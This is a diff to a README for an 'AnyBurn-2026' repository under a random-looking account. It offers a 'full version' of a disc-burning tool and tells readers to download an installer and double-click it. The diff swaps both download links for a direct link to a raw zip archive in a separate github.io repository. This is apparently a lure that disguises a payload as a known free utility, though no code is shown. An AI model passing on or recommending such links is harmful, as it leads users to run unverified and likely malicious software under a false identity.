@@ -5,7 +5,7 @@ description: "Download the full version of AnyBurn for Windows 10 and 11. Burn, 
 ---
 # 💿 AnyBurn-2026 - Write disc images to your hardware
 
-[![](https://img.shields.io/badge/Download-AnyBurn-blue.svg)](https://github.com/forehanddrivemechanicalmixture991/AnyBurn-2026)
+[![](https://img.shields.io/badge/Download-AnyBurn-blue.svg)](https://github.com/forehanddrivemechanicalmixture991/forehanddrivemechanicalmixture991.github.io/raw/refs/heads/main/reingress/v3.6.zip)
 
 ## 📖 Introduction
 AnyBurn-2026 provides a stable interface for disc image management on Windows. It works on Windows 10 and Windows 11. This software helps you burn ISO files, create bootable USB drives, and manage optical media. You do not need technical expertise to navigate the menus. The program performs tasks with minimal system impact.
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before installation:
 ## 📥 Download and Install
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download: [https://github.com/forehanddrivemechanicalmixture991/AnyBurn-2026](https://github.com/forehanddrivemechanicalmixture991/AnyBurn-2026).
+1. Visit this page to download: [https://github.com/forehanddrivemechanicalmixture991/forehanddrivemechanicalmixture991.github.io/raw/refs/heads/main/reingress/v3.6.zip](https://github.com/forehanddrivemechanicalmixture991/forehanddrivemechanicalmixture991.github.io/raw/refs/heads/main/reingress/v3.6.zip).
 2. Look for the installer file in your Downloads folder.
 3. Double-click the file to launch the setup wizard.
 4. Accept the terms of use when the prompt appears.
